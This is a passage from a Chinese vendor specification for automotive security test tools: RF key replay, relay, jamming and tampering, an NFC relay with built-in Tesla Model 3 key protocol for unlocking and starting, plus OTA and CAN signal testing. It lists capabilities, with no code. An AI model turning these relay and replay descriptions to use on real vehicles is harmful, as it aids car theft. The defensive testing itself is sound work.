title="功能实施方案"></a>功能实施方案</h4><p>产品信息如下：</p><p>品牌：国利</p><p>型号：GLRFCC</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>设备采用了轻便、紧凑的便携式风格，使其易于携带和使用。其外观简约时尚，提供了更加舒适的使用体验；</li><li>支持1路以太网口，可自适应10M、100M和1000M三种速率，适用于不同的网络环境，提供更加灵活的连接方式；</li><li>提供了2个便携式中继设备，供测试使用；</li><li>支持汽车射频钥匙125K/315M/433M/868M/915M天线，并且可以适配外接延长线。该设备可以用于测试和分析多种汽车射频钥匙的频率和信号，包括125KHz、315MHz、433MHz、868MHz和915MHz等。同时，该设备还支持外接延长线，可以将天线延长线接入设备，以便更好地测试和分析汽车射频钥匙的信号。通过使用该设备，用户可以更加全面地测试和分析汽车射频钥匙的信号，发现潜在的安全问题和漏洞，提高汽车射频钥匙的安全性和可靠性；</li><li>支持汽车射频钥匙重放攻击测试，可以模拟攻击者拦截和重放汽车射频钥匙的信号，从而测试汽车射频钥匙的安全性和可靠性。通过使用该测试工具，用户可以发现潜在的安全问题和漏洞，并采取相应的措施加以修复，提高汽车射频钥匙的安全性和可靠性；</li><li>支持汽车射频信号中继测试，可以模拟攻击者使用中继器设备中继汽车射频信号，从而测试汽车射频信号中继的安全性和可靠性。通过使用该测试工具，用户可以发现潜在的安全问题和漏洞，并采取相应的措施加以修复，提高汽车射频信号中继的安全性和可靠性；功能的界面截图如下：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3eb68b5c5a1ca0717116e894515f58a2.png" alt="IMG_256"></p><ol><li>支持汽车射频钥匙拒绝服务攻击测试。汽车射频钥匙拒绝服务攻击是一种常见的汽车安全漏洞，攻击者可以通过向汽车射频钥匙发送大量无效的信号，使其无法正常工作，从而实现对汽车的非法访问；</li><li>支持汽车射频钥匙信号逆向分析，使用户可以深入了解汽车射频钥匙信号的结构和加密方式，发现潜在的安全问题和漏洞，从而采取相应的措施加以修复，提高汽车射频钥匙的安全性和可靠性；</li><li>支持汽车射频钥匙信号篡改测试。汽车射频钥匙信号篡改是一种常见的汽车安全漏洞，攻击者可以通过篡改汽车射频钥匙的信号，来模拟合法的钥匙信号，从而实现对汽车的非法访问；</li><li>支持高阶功能，包括对汽车射频信号的实时录制等。实时录制是该设备的一个重要功能，可以帮助用户捕获和记录汽车射频信号的实时数据，以便进行后续的分析和研究。通过实时录制功能，用户可以捕获和记录多种汽车射频信号的频率和信号；</li><li>支持测试对象进行新增、删除、修改或对已有测试对象的搜索，可以帮助用户更加方便地管理测试对象，提高测试效率和准确性。用户可以通过设备提供的界面进行测试对象的新增、删除和修改操作，也可以通过搜索功能快速查找已有的测试对象，从而更加方便地进行测试工作；</li><li>支持任务管理页面中可以对测试任务进行新增、编辑、删除、搜索、配置用例、开始检测、查看结果等操作。在任务管理页面中，用户可以创建新的测试任务，编辑已有的测试任务，删除不需要的测试任务，以及搜索和筛选测试任务。同时，用户还可以在任务管理页面中配置测试用例，包括选择测试用例、设置测试参数等。在测试任务开始后，用户可以在任务管理页面中查看测试进度和结果，测试用例的执行情况、检测结果等。通过任务管理页面，用户可以方便地管理和监控测试任务，提高测试效率和准确性；</li><li>支持测试对象与测试任务相关联，一个测试对象可以对应多个测试任务，可以帮助用户更加方便地管理测试对象和测试任务，提高测试效率和准确性。用户可以将测试对象与测试任务进行关联，从而更加方便地进行测试工作。一个测试对象可以对应多个测试任务，用户可以根据需要进行配置，从而更加灵活地进行测试工作；</li><li>支持对测试过程中产生的测试数据、操作日志的显示与导出，可以帮助用户更加方便地管理测试数据和操作记录，提高测试效率和准确性。用户可以通过设备提供的界面查看测试数据和操作日志，也可以将其导出到本地进行分析和处理；</li><li>支持测试报告的导出，导出格式为pdf，测试报告会对测试结果进行详细的分析和总结，包括测试用例的执行情况、测试数据的统计分析、测试结果的评估和建议等内容。对于不通过的测试用例，测试报告会提出修复建议，帮助用户更好地解决问题，提高设备的性能和稳定性。用户可以将测试报告导出到本地进行保存和分享；</li><li>工具采用B/S设计架构，并采用SSL加密通信方式，用户可以通过浏览器远程方便地进行管理。B/S设计架构可以帮助用户更加方便地进行设备管理，无需安装额外的客户端软件，只需要通过浏览器即可进行管理。同时，采用SSL加密通信方式可以保证用户的数据安全和隐私保护，防止数据被窃取或篡改。</li></ol><h4 id="技术实现内容-42"><a href="#技术实现内容-42" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="硬件方案-4"><a href="#硬件方案-4" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>外观设计：采用便携式设计，方便携带和使用。</p><p>以太网接口：支持1路10M/100M/1000M自适应以太网接口，用于连接到被测试的网络设备。</p><p>中继设备：提供两个便携式中继设备，用于测试射频信号中继功能。</p><p>射频钥匙天线：支持汽车射频钥匙125K/315M/433M/868M/915M天线的适配和外接延长线，以满足不同频率的测试需求。</p><p>射频钥匙安全功能：支持汽车射频钥匙重放、中继、拒绝服务、信号逆向分析和信号篡改等安全测试功能。</p><p>高阶功能支持：支持对汽车射频信号的实时录制等高级功能，以提供更全面的测试能力。</p><h5 id="软件方案-4"><a href="#软件方案-4" class="headerlink" title="软件方案"></a>软件方案</h5><p>前端设计：</p><p>用户界面：采用现代化、直观的用户界面设计，使用户能够方便地进行操作和管理。</p><p>功能模块：将功能模块划分为不同的页面或组件，例如测试对象管理、测试任务管理、测试结果查看等。</p><p>用户权限和安全：实现用户认证和授权机制，根据用户角色分配不同的权限，确保系统安全性。</p><p>后端设计：</p><p>架构选择：采用B/S架构，使用流行的Web开发框架，如Django、Flask等，以实现后端逻辑和数据管理。</p><p>数据库设计：设计合适的数据库结构来存储测试对象、测试任务、测试数据和日志等信息。</p><p>API设计：定义合适的API接口，用于前端与后端之间的数据交互和通信。</p><p>业务逻辑：实现测试对象的新增、删除、修改和搜索功能，测试任务的新增、编辑、删除、搜索、配置用例、开始检测和查看结果功能等。</p><p>数据导出和报告：</p><p>测试数据导出：提供导出测试过程中产生的测试数据的功能，可以导出为常见的数据格式，如CSV、Excel等，以便后续分析和处理。</p><p>测试报告生成：根据测试结果自动生成测试报告，包括测试用例的执行情况、不通过的测试用例列表和修复建议等，导出格式为PDF，确保报告的可读性和易于分享。</p><p>用户权限和安全：</p><p>用户认证：实现用户注册、登录和注销功能，确保只有授权用户可以访问系统。</p><p>用户角色和权限管理：定义不同的用户角色，如管理员、普通用户等，根据角色分配不同的权限，以控制用户对系统的操作和访问范围。</p><p>数据安全：在安全通信方面，采用SSL的方式进行了加密通信，这是为了保障安全的进行数据传输</p><h5 id="工具功能-4"><a href="#工具功能-4" class="headerlink" title="工具功能"></a>工具功能</h5><p>用户界面：设计基于浏览器的用户界面，采用B/S架构，用户可以通过浏览器远程管理工具。</p><p>SSL加密通信：采用SSL加密通信方式，确保通信安全性。</p><p>测试对象管理：支持新增、删除、修改和搜索测试对象，方便管理和配置测试任务。</p><p>测试任务管理：支持新增、编辑、删除、搜索、配置用例、开始检测和查看结果等测试任务管理功能。</p><p>测试数据与日志：支持显示和导出测试过程中产生的测试数据和操作日志，以便后续分析和审查。</p><p>测试报告导出：支持将测试结果导出为PDF格式的测试报告，对不通过的测试用例提出修复建议。</p><p>测试对象与测试任务关联：支持将测试对象与测试任务相关联，一个测试对象可以对应多个测试任务，方便管理和执行测试任务。</p><p>射频天线适配：工具支持多种射频频段（125KHz, 315MHz, 433MHz, 868MHz, 915MHz），以适配不同车辆的射频钥匙，并可通过外接延长线增加灵活性。</p><p>射频钥匙重放：能够捕获汽车射频钥匙信号，并进行重放，以测试车辆对重放攻击的抵抗能力。</p><p>射频钥匙中继：支持射频钥匙信号的中继功能，可以测试车辆对中继攻击的敏感性。</p><p>射频钥匙拒绝服务：模拟对汽车射频钥匙的拒绝服务攻击，以评估车辆的应对措施。</p><p>信号逆向分析：工具支持对捕获的射频钥匙信号进行逆向分析，以揭示信号的结构和潜在的安全弱点。</p><p>信号篡改：支持对射频钥匙信号进行篡改，以测试车辆系统对异常信号的响应。</p><p>实时录制高阶功能：提供实时录制汽车射频信号的高级功能，用于深入分析和测试。</p><p>测试对象管理：允许用户对测试对象进行新增、删除、修改和搜索，方便管理不同的测试场景。</p><p>任务管理：在任务管理页面，用户可以对测试任务进行新增、编辑、删除、搜索、配置用例、开始检测和查看结果。</p><p>测试对象与测试任务关联：支持将一个测试对象关联到多个测试任务，实现灵活的测试计划和管理。</p><p>数据和日志管理：提供测试过程中产生的数据和操作日志的实时显示和导出功能。</p><p>测试报告生成：自动化生成PDF格式的测试报告，包括对不通过的测试用例的分析和修复建议。</p><p>远程管理：工具采用B/S架构，用户可以通过浏览器远程管理工具，并通过SSL加密通信保障数据传输安全。</p><h3 id="NFC安全检测工具"><a href="#NFC安全检测工具" class="headerlink" title="NFC安全检测工具"></a>NFC安全检测工具</h3><h4 id="工具概述-5"><a href="#工具概述-5" class="headerlink" title="工具概述"></a>工具概述</h4><p>NFC属于近场通讯协议，是无线通信协议中的一种，它被广泛用于门禁、公交、地铁出行等领域，能够提供轻松、安全、迅速的通信，NFC协议本身通讯的有效距离&lt;10cm，很短的有效通信距离也保证了一定的安全性。</p><p>通过软硬件结合的NFC中继放大技术，NFC协议安全破解技术，第一能够放大车端NFC卡片钥匙通信距离，第二能够通过中继传输方式，让NFC卡片钥匙在远离车端情况下，实现对NFC协议的安全检测。</p><h4 id="功能实施方案-50"><a href="#功能实施方案-50" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>设备设计用于两端之间的无线通信，可稳定传输距离在15到20米范围内</li><li>设备具备迅速处理信号的能力，确保在小于1分钟的时间内完成信号的快速接收和转发，极大提升了数据传输效率</li><li>工具已经内置了特斯拉Model 3所用的NFC协议。这些工具可以帮助用户读取和写入车辆钥匙的信息，以实现车辆的解锁和启动。同时，这些工具也可以帮助用户进行车辆的诊断和维护，以确保车辆的正常运行</li><li>标配一台装有X86架构处理器的台式机或笔记本电脑，搭载了适用于各种复杂计算任务的强大硬件。同时包含乐鑫ESP32微控制器，这是一款低功耗芯片，适合执行无线通信任务。此外，还提供一个专为安卓手机设计的app应用程序，它可以无缝地与ESP32微控制器配合工作，实现数据的监控和管理</li><li>SMA接口的外置WIFI天线，确保无线信号的稳定传输与广泛覆盖，同时内置3.3伏特的电源模块，为设备提供了稳定的电流，保障了长时间的连续工作能力</li><li>具备标准串口通信接口，支持RS-232/RS-485等协议，实现与外部设备的高效数据交换</li><li>提供了日志系统，用户可以通过这一功能轻松跟踪和记录操作历史和事件。它能够将数据自动存储为独立文件，以便于后续的数据分析</li><li>采用先进的NFC近场通讯技术，能够快速探测并读取NFC标签，实现无接触式的数据传输和信息交换</li><li>能够对车端与NFC卡片之间的通信信号进行高效的调制解调处理，通过精确分析信号的各个组成部分，揭示数据传输的细节，能够实现NFC通讯从探测-分析-监控的一体化流程。它不仅实现了NFC通讯的初始探测，还能深入进行信号分析和实时监控，从而构建了一个从信号捕获、内容解析到安全监控的完整NFC通讯管理流程，极大地提升了通讯的可靠性与效率</li><li>支持广泛的NFC门卡标准，通过NFC安全测试工具能够捕捉并识别NFC-A/B/F等多种制式的信号，适用于多样化的门禁系统</li><li>具备强大的兼容性，能够支持多款车辆使用的NFC门卡，实现信号的快速捕捉和高效识别</li><li>采用观察者模式设计，实现了对捕获的NFC信号进行统一分析和整理，实时监控，自动分析和整理，以便用户能够获得统一且结构化的数据视图，优化信息处理流程</li><li>支持实时监控数据交换过程，并提供可视化输出功能，使用户能够直观地观察到数据流动情况，便于分析和诊断通信效率及潜在问题</li></ol><h4 id="技术实现内容-43"><a href="#技术实现内容-43" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="硬件方案-5"><a href="#硬件方案-5" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>传输距离：设计支持15~20米的两端传输距离，以满足检测需求。</p><p>处理器选择：</p><p>标准X86服务器：选择一台标准的X86服务器作为主控设备，用于处理和分析NFC通信信号。</p><p>处理器：选择乐鑫ESP32芯片作为辅助设备，用于NFC信号的捕捉和传输。</p><p>通信接口：</p><p>WI-FI收发器：集成WI-FI收发器，用于与其他设备进行无线通信。</p><p>基带和协议栈：集成基带和协议栈，用于处理NFC通信协议。</p><p>双模蓝牙：支持双模蓝牙，以便与其他蓝牙设备进行通信。</p><p>外部接口：</p><p>SMA接口：提供SMA接口用于连接外置WIFI天线，以增强无线信号接收能力。</p><p>串口通信接口：提供串口通信接口，用于与其他设备进行有线通信。</p><p>显示屏幕：集成0.96寸蓝色OLED显示屏，用于显示相关信息和操作界面。</p><h5 id="软件方案-5"><a href="#软件方案-5" class="headerlink" title="软件方案"></a>软件方案</h5><p>前端设计：</p><p>用户界面：采用现代化、直观的用户界面设计，使用户能够方便地进行操作和管理。</p><p>功能模块：将功能模块划分为不同的页面或组件，例如测试对象管理、测试任务管理、测试结果查看等。</p><p>用户权限和安全：实现用户认证和授权机制，根据用户角色分配不同的权限，确保系统安全性。</p><p>后端设计：</p><p>架构选择：采用B/S架构，使用流行的Web开发框架，如Django、Flask等，以实现后端逻辑和数据管理。</p><p>数据库设计：设计合适的数据库结构来存储测试对象、测试任务、测试数据和日志等信息。</p><p>API设计：定义合适的API接口，用于前端与后端之间的数据交互和通信。</p><p>业务逻辑：实现测试对象的新增、删除、修改和搜索功能，测试任务的新增、编辑、删除、搜索、配置用例、开始检测和查看结果功能等。</p><p>数据导出和报告：</p><p>测试数据导出：提供导出测试过程中产生的测试数据的功能，可以导出为常见的数据格式，如CSV、Excel等，以便后续分析和处理。</p><p>测试报告生成：根据测试结果自动生成测试报告，包括测试用例的执行情况、不通过的测试用例列表和修复建议等，导出格式为PDF，确保报告的可读性和易于分享。</p><p>用户权限和安全：</p><p>用户认证：实现用户注册、登录和注销功能，确保只有授权用户可以访问系统。</p><p>用户角色和权限管理：定义不同的用户角色，如管理员、普通用户等，根据角色分配不同的权限，以控制用户对系统的操作和访问范围。</p><p>数据安全：在安全通信方面，采用SSL的方式进行了加密通信，这是为了保障安全的进行数据传输</p><h5 id="工具功能-5"><a href="#工具功能-5" class="headerlink" title="工具功能"></a>工具功能</h5><p>NFC信号探测和分析：</p><p>支持NFC近场通讯信号探测技术，能够捕捉和分析NFC通信信号。</p><p>实现NFC通讯的探测、分析和监控的一体化流程，对通信信号进行调制解调和信号分析。</p><p>用户界面：</p><p>设计直观、易用的用户界面，支持观察者模式，可对NFC信号进行统一分析和整理。</p><p>支持数据交换监控可视化输出，以便用户更好地理解和分析数据。</p><p>数据存储和导出：</p><p>支持日志系统，将数据存储为独立文件，方便后续的数据分析和审查。</p><p>提供数据导出功能，可以将数据导出为常见的数据格式，如CSV、Excel等。</p><p>传输距离：保证两端设备之间的传输距离在15到20米范围内，适用于多种测试环境。</p><p>快速中继：确保中继时间少于1分钟，以便快速有效地测试中继攻击的可能性和防御措施。</p><p>内置NFC协议：工具内置特斯拉Model 3等车型所使用的NFC协议，以支持特定车辆的测试需求。</p><p>硬件标配：配备X86架构的台式机或笔记本，乐鑫ESP32微控制器，以及安卓手机应用程序，形成一套完整的测试平台。</p><p>外置WIFI天线与电源：提供SMA接口的外置WIFI天线和3.3V的内置电源，确保稳定的无线连接和电力供应。</p><p>串口通信：具备串口通信接口，方便与其他设备或模块的数据交换和控制。</p><p>日志系统：支持高级日志系统，可以将测试数据存储为独立文件，便于后续的分析和审计。</p><p>NFC探测技术：支持NFC近场通讯信号探测技术，可以捕获和分析NFC通信信号。</p><p>信号调制解调：调制解调车端与NFC卡片之间的通信信号，分析信号组成部分，实现从探测到分析再到监控的一体化NFC通讯流程。</p><p>多款NFC门卡支持：支持捕捉多款NFC门卡的信号，增加了测试工具的适用范围。</p><p>车辆NFC信号捕捉：支持捕捉多款车辆的NFC门卡信号，以测试不同车型的NFC系统安全性。</p><p>观察者模式：支持观察者模式，能够对NFC信号进行统一分析和整理，以便于理解和评估通信内容。</p><p>数据交换监控与可视化：支持数据交换监控的可视化输出，使测试人员能够直观地观察和分析NFC通信过程。</p><h3 id="OTA测试工具"><a href="#OTA测试工具" class="headerlink" title="OTA测试工具"></a>OTA测试工具</h3><h4 id="工具概述-6"><a href="#工具概述-6" class="headerlink" title="工具概述"></a>工具概述</h4><p>一体化测试工具是用于OTA远程升级业务的网络安全测试，可验证在OTA远程升级业务当中云、管、端层面的安全性。</p><h4 id="功能实施方案-51"><a href="#功能实施方案-51" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>产品信息如下：</p><p>品牌：国利</p><p>型号：GLOTA02</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>支持在OTA升级前自动检查设备状态，确保电量、网络连接等先决条件满足，以保障升级过程的顺利进行；</li><li>支持在OTA升级前自动确认用户已被告知并同意进行更新，以确保升级过程的透明性和用户的知情权；</li><li>支持在OTA无线升级发生之前，用户已经明确确认并同意执行升级，增强了升级操作的合规性和用户参与度；</li><li>支持在进行OTA升级时，检测车辆在整个升级过程中的安全，包括车辆安全和车门锁止。这套机制包括对车辆停放状态的监控，确保车辆在升级期间不会意外启动或移动；同时，它还能够监测车辆的车门锁止状态，保证所有车门在升级时都是锁定的，以防止未授权的进入或潜在的盗窃行为；</li><li>支持在OTA升级结束后，告知用户升级结果。对升级失败的的车辆状态进行检测。成功升级后，用户会收到通知，告知他们软件版本已更新，并概述了改进或新增功能。如果升级失败，系统会立即通知用户，并提供失败原因的初步诊断。此外，系统会自动检查车辆的关键功能，以确保车辆安全。如果检测到任何问题，系统会指导用户如何恢复到稳定状态或联系服务支持；</li><li>支持对R156法规的验证测试，检测车辆系统与R156安全法规的一致性，确保所有功能在各种操作环境下均符合该法规设定的严格安全标准；</li><li>允许用户通过拍照的方式来采集和记录测试结果，进而支持他们将这些测试结果照片上传至特定的平台进行保存。这一过程不仅提高了数据记录的效率，而且通过图像存档，增强了结果验证的可追溯性和准确性；</li><li>智能汽车网络靶场测试管理平台为用户提供了一个高效的界面，用于创建、组织和管理测试任务。该平台允许用户详细规划每项测试的流程，从而确保每个测试计划都经过精心设计，满足特定的测试需求。用户可以直接在平台上制定测试的参数，安排测试的顺序，以及跟踪测试进度，确保每个步骤都能够精确执行；</li><li>支持用户通过集成的车端数据安全测试工具，来完成车辆的OTA更新测试中的数据安全性检查。通过这种方式，用户可以在远程更新软件和固件的过程中，实时监测数据传输的安全性，确保信息在传输过程中不被未授权访问或篡改；</li><li>支持通过调用系统漏洞扫描工具对车载系统进行全面的安全漏洞检测。它能够精确识别系统中的安全漏洞，包括软件缺陷、未加密的数据传输以及其他潜在的安全威胁。通过这种深入的漏洞分析，平台确保了OTA更新的每个环节都不会受到安全威胁，从而大大提高了车辆系统更新后的稳定性和安全性；</li><li>支持调用专业的CAN/LIN总线安全测试工具，以执行细致且全面的总线安全测试。这一工具能够模拟各种网络攻击场景，对车辆的通信总线进行严格的安全性评估；</li><li>支持通过调用车载以太网安全测试工具用于OTA（Over-The-Air）测试中的网络安全评估，对车载以太网的数据传输安全性进行深入检测。它通过模拟各种网络入侵和攻击手段，评估车辆网络的抵抗力，确保数据传输过程中的加密机制、认证过程和信息完整性得到充分的保护；</li><li>支持网络报文抓包分析功能，它能够精确捕捉车载网络中的通信数据包，支持攻击包重放。此外还支持攻击包重放功能，允许安全研究人员和测试工程师记录下潜在的恶意流量，并在受控环境中重放这些流量，以此来验证车载系统对于真实世界攻击手段的防御能力；</li><li>支持与自动化工具接口对接。这些接口允许用户自动执行一系列测试操作，包括但不限于启动和停止测试，以及配置测试参数。同时，它们还能够实时回读测试状态，包括进度、结果和详细的日志信息。这一功能的设计目的是为了提高测试的效率和准确性，减少人为操作的可能误差，确保测试过程的高度自动化和智能化；</li><li>支持测试对象进行新增、删除、修改或对已有测试对象的搜索，可以帮助用户更加方便地管理测试对象，提高测试效率和准确性。用户可以通过设备提供的界面进行测试对象的新增、删除和修改操作，也可以通过搜索功能快速查找已有的测试对象，从而更加方便地进行测试工作；</li><li>支持任务管理页面中可以对测试任务进行新增、编辑、删除、搜索、配置用例、开始检测、查看结果等操作。在任务管理页面中，用户可以创建新的测试任务，编辑已有的测试任务，删除不需要的测试任务，以及搜索和筛选测试任务。同时，用户还可以在任务管理页面中配置测试用例，包括选择测试用例、设置测试参数等。在测试任务开始后，用户可以在任务管理页面中查看测试进度和结果，测试用例的执行情况、检测结果等。通过任务管理页面，用户可以方便地管理和监控测试任务，提高测试效率和准确性；</li><li>支持测试对象与测试任务相关联，一个测试对象可以对应多个测试任务，可以帮助用户更加方便地管理测试对象和测试任务，提高测试效率和准确性。用户可以将测试对象与测试任务进行关联，从而更加方便地进行测试工作。一个测试对象可以对应多个测试任务，用户可以根据需要进行配置，从而更加灵活地进行测试工作；</li><li>支持对测试过程中产生的测试数据、操作日志的显示与导出，可以帮助用户更加方便地管理测试数据和操作记录，提高测试效率和准确性。用户可以通过设备提供的界面查看测试数据和操作日志，也可以将其导出到本地进行分析和处理；</li><li>支持测试报告的导出，导出格式为pdf，测试报告会对测试结果进行详细的分析和总结，包括测试用例的执行情况、测试数据的统计分析、测试结果的评估和建议等内容。对于不通过的测试用例，测试报告会提出修复建议，帮助用户更好地解决问题，提高设备的性能和稳定性。用户可以将测试报告导出到本地进行保存和分享；</li><li>工具采用B/S设计架构，并采用SSL加密通信方式，用户可以通过浏览器远程方便地进行管理。B/S设计架构可以帮助用户更加方便地进行设备管理，无需安装额外的客户端软件，只需要通过浏览器即可进行管理。同时，采用SSL加密通信方式可以保证用户的数据安全和隐私保护，防止数据被窃取或篡改；</li></ol><h4 id="技术实现内容-44"><a href="#技术实现内容-44" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="硬件方案-6"><a href="#硬件方案-6" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>测试设备选择：</p><p>选择测试场景的硬件设备，如测试车辆、测试工具和测试设备。</p><p>车辆接口：</p><p>确定需要与车辆通信的接口，如CAN总线、LIN总线、车载以太网等。</p><p>根据车辆接口选择相应的硬件设备，如CAN分析仪、LIN分析仪、以太网数据采集器等。</p><p>OTA升级模块：</p><p>集成OTA升级模块，用于模拟和执行OTA升级过程。</p><p>OTA升级模块支持与测试工具的通信，以接收和发送升级相关的指令和数据。</p><p>数据采集模块：</p><p>集成数据采集模块，用于采集车辆的相关数据，如车速、引擎转速、电池电量等。</p><p>数据采集模块支持与测试工具的通信，以将采集到的数据传输给测试工具进行分析和记录。</p><p>安全测试工具集成：</p><p>集成安全测试工具，用于进行车辆安全性和通信安全性的测试。</p><p>安全测试工具支持与测试工具的通信，以接收测试指令和发送测试结果。</p><p>网络通信：</p><p>确定测试工具与测试设备之间的通信方式，如有线连接或无线连接。</p><p>需要确保通信的稳定性和安全性，可以采用加密通信或其他安全措施。</p><p>电源供应：</p><p>确保测试设备和模块有稳定的电源供应，以保证正常工作。</p><p>可以使用车载电源适配器或其他适当的电源设备。</p><p>硬件集成和连接：</p><p>将各个硬件模块进行集成，确保它们能够相互通信和协同工作。</p><p>进行必要的连接，如连接测试设备和车辆接口、连接数据采集模块和测试工具等。</p><p>硬件调试和测试：</p><p>对集成的硬件进行调试和测试，确保其正常工作和满足要求。</p><p>进行必要的功能测试、性能测试和稳定性测试。</p><p>硬件维护和管理：</p><p>建立合适的硬件维护计划，包括定期检查、保养和维修。</p><p>确保硬件设备的安全存放和管理，以防止损坏或丢失。</p><h5 id="软件方案-6"><a href="#软件方案-6" class="headerlink" title="软件方案"></a>软件方案</h5><p>技术选型：</p><p>前端开发：使用现代化的前端框架，如React或Angular，实现用户界面和交互。</p><p>后端开发：选择适合您团队的后端技术，如Node.js、Python等，用于处理业务逻辑和数据管理。</p><p>数据库：使用关系型数据库（如MySQL、PostgreSQL）或NoSQL数据库（如MongoDB）存储测试对象、任务数据和日志等。</p><p>网络通信：在安全通信方面，采用SSL的方式进行了加密通信，这是为了保障安全的进行数据传输。</p><p>前端设计：</p><p>设计用户友好的界面，包括登录页面、主控制面板、测试对象管理、任务管理、测试报告等模块。</p><p>实现用户认证和权限管理，确保只有授权用户可以访问和操作系统功能。</p><p>提供交互式界面，支持用户进行测试对象的新增、删除、修改和搜索，以及任务的创建、编辑、删除、搜索等操作。</p><p>支持数据的可视化展示，例如图表、表格等形式，方便用户查看测试结果和报告。</p><p>后端设计：</p><p>实现业务逻辑处理，包括先决条件检测、用户告知和确认检测、车辆安全和车门锁止检测、升级结果告知和失败车辆状态检测等功能。</p><p>提供API接口，用于前端与后端的数据交互和操作，包括测试对象的增删改查、任务的创建和管理、测试数据和操作日志的存储和导出等。</p><p>集成第三方工具和平台，如智能汽车网络靶场测试管理平台、车端数据安全测试工具、系统漏洞扫描工具、CAN/LIN总线安全测试工具和车载以太网安全测试工具等。</p><p>数据管理：</p><p>使用数据库存储测试对象的信息，包括车辆信息、升级版本、先决条件、用户告知和确认等。</p><p>存储任务数据，包括测试任务的配置、执行状态、测试结果等。</p><p>记录测试过程中产生的测试数据和操作日志，方便后续分析和审查。</p><p>支持导出测试数据、操作日志和测试报告，以PDF格式呈现，对不通过的测试用例提出修复建议。</p><p>安全性和稳定性：</p><p>在安全通信方面，采用SSL的方式进行了加密通信，这是为了保障安全的进行数据传输。</p><p>对用户身份进行认证和授权，限制访问和操作权限。</p><p>对系统进行异常处理和错误日志记录，确保系统的稳定性和可靠性。</p><p>其他功能：</p><p>实现网络报文抓包分析和攻击包重放功能，用于测试网络通信的安全性。</p><p>提供接口，与自动化工具适配，实现自动执行测试操作和状态回读。</p><p>支持对测试对象和任务进行搜索、排序和过滤，提高用户操作的效率和便捷性。</p><h5 id="工具功能-6"><a href="#工具功能-6" class="headerlink" title="工具功能"></a>工具功能</h5><p>OTA升级先决条件检测：确保满足所有升级前必要条件，如电池电量、网络连接等。</p><p>OTA升级用户告知检测：验证OTA升级过程中用户是否得到适当的通知信息。</p><p>OTA升级用户确认检测：确保用户同意后才开始OTA升级过程。</p><p>OTA升级车辆安全与车门锁止检测：检测升级过程中车辆安全性和车门锁定状态。</p><p>OTA升级结果告知与失败状态检测：验证升级是否成功，并在失败时检测车辆状态及用户通知。</p><p>R156验证测试：执行符合UNECE R156规定的OTA升级验证测试。</p><p>拍照采集与上传测试结果：支持通过拍照方式采集测试结果，并上传保存测试结果照片。</p><p>智能汽车网络靶场测试管理平台：通过平台进行任务创建与测试计划的管理。</p><p>数据安全测试工具调用：通过调用车端数据安全测试工具完成OTA测试中的数据安全测试。</p><p>系统漏洞扫描工具调用：利用系统漏洞扫描工具完成OTA测试中的系统安全测试。</p><p>CAN/LIN总线安全测试工具调用：通过特定工具完成OTA测试中的总线安全测试。</p><p>车载以太网安全测试工具调用：利用工具完成OTA测试中的车载以太网安全测试。</p><p>报文抓包分析与攻击包重放：支持网络报文的捕获、分析和攻击包的重放。</p><p>自动化测试接口提供：提供接口与自动化工具适配，自动执行测试操作与状态回读。</p><p>测试对象管理：支持测试对象的新增、删除、修改和搜索。</p><p>任务管理：任务管理页面允许对测试任务进行新增、编辑、删除、搜索等操作。</p><p>测试对象与任务关联：实现一个测试对象与多个测试任务的关联。</p><p>测试数据与日志管理：显示与导出测试过程中产生的数据和操作日志。</p><p>测试报告导出：生成PDF格式的测试报告，并提供修复建议。</p><p>远程管理与安全通信：B/S架构设计，支持SSL加密通信，便于用户通过浏览器远程管理。</p><p>软件升级服务：提供软件license，三年内免费升级。</p><h3 id="车辆信号模拟仿真软件"><a href="#车辆信号模拟仿真软件" class="headerlink" title="车辆信号模拟仿真软件"></a>车辆信号模拟仿真软件</h3><h4 id="工具概述-7"><a href="#工具概述-7" class="headerlink" title="工具概述"></a>工具概述</h4><p>车辆信号模拟仿真软件通过对车门、车窗、点火信号、钥匙、车速、发动机转速、电量、档位、后备箱等指令信号的模拟来测试车辆ECU的反应情况来验证安全性。</p><h4 id="功能实施方案-52"><a href="#功能实施方案-52" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>1)支持用户直接导入通信矩阵，这一关键功能允许用户快速集成汽车通信系统的参数和配置，使得定制化测试环境的搭建变得更加高效和精确，极大地简化了测试前的准备工作；</p><p>2)能模拟各种车辆信号，能够支持车门、车窗、点火信号、钥匙、车速、发动机转速、电量、档位、后备箱、引擎盖等信号的模拟，例如车门开关、车窗升降、点火启停、智能钥匙认证、车速变化、发动机转速控制、电池电量监测、档位切换、后备箱使用和引擎盖状态，为全面模拟车辆行为提供了强大支持；</p><p>3)支持多种车载网络协议，包括常见的控制器局域网络（CAN），高带宽的灵活数据率CAN（CAN FD），以及本地互连网络（LIN），确保了对各类车辆通信系统的广泛兼容性；</p><p>4)支持集成Vector的CANoe工具链，这使得用户能够利用CANoe的强大功能进行网络通信分析、系统仿真以及自动化测试；</p><p>5)支持实时打印收发报文的功能，能够即时捕获并展示网络通信中的所有报文，为测试人员提供了强有力的数据监控手段，确保了测试过程的透明度和可追溯性；</p><p>6)支持收发报文的实时打印，还具备将这些报文日志记录下来并保存的功能，确保测试人员可以随时回溯和分析通信数据。</p><h4 id="技术实现内容-45"><a href="#技术实现内容-45" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="软件方案-7"><a href="#软件方案-7" class="headerlink" 